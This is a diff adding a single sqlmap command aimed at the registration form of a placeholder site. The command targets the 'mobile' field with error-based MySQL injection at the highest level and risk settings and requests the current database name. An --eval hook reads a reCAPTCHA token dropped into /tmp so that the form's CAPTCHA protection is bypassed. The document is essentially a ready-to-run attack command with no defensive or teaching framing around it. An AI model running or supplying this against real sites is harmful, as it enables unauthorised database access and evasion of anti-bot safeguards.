@@ -1,0 +1,37 @@
+python sqlmap.py \
+-u "https://example.com/register" \
+--data="username=test&full_name=test&password=Test@123&password_again=Test@123&email=test@example.com&mobile=1*&position=test&reason=test&recaptcha_response=PLACEHOLDER&submit=" \
+--cookie="PHPSESSID=SESSION_ID_PLACEHOLDER" \
+--headers="Origin: https://example.com
+Accept-Language: en-US,en;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document" \
+--eval="
+import os,time
+
+def wait_token():
+    t=0
+    while not os.path.exists('/tmp/current_recaptcha_token.txt'):
+        time.sleep(0.2)
+        t+=0.2
+        if t>60:
+            break
+
+wait_token()
+
+if os.path.exists('/tmp/current_recaptcha_token.txt'):
+    with open('/tmp/current_recaptcha_token.txt') as f:
+        recaptcha_response=f.read().strip()
+    os.remove('/tmp/current_recaptcha_token.txt')
+" \
+--batch \
+--dbms=mysql \
+--technique=E \
+--level=5 --risk=3 \
+--string="DB_ERROR_PLACEHOLDER" \
+--current-db \
+--flush-session \
+--threads=1 \
+-v 4
